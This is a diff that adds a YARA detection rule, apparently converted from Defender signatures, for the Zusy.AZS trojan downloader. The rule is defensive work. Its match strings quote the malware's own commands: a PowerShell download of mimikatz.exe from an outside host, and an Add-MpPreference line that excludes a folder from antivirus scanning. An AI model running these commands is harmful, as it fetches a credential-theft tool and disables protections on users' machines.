@@ -79,3 +79,28 @@ rule TrojanDownloader_Win32_Zusy_HNA_2147928997_0
         )
 }
 
+rule TrojanDownloader_Win32_Zusy_AZS_2147935782_0
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "TrojanDownloader:Win32/Zusy.AZS!MTB"
+        threat_id = "2147935782"
+        type = "TrojanDownloader"
+        platform = "Win32: Windows 32-bit platform"
+        family = "Zusy"
+        severity = "Critical"
+        info = "MTB: Microsoft Threat Behavior"
+        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
+        threshold = "15"
+        strings_accuracy = "High"
+    strings:
+        $x_1_1 = {51 8d 4d 88 83 fa 08 51 6a 00 6a 00 68 00 02 00 00 6a 00 6a 00 8d 45 d4 0f 43 45 d4 6a 00 50 6a 00}  //weight: 1, accuracy: High
+        $x_5_2 = "cmd /c powershell Invoke-WebRequest -Uri https://xspacet.wiki/stein/mimikatz.exe -Outfile C:\\WinXRAR\\mimikatz.exe" ascii //weight: 5
+        $x_4_3 = "cmd /c powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath \"C:\\WinXRAR" ascii //weight: 4
+        $x_3_4 = "Process launched successfully" ascii //weight: 3
+        $x_2_5 = "lderd\\Release\\lderd.pdb" ascii //weight: 2
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
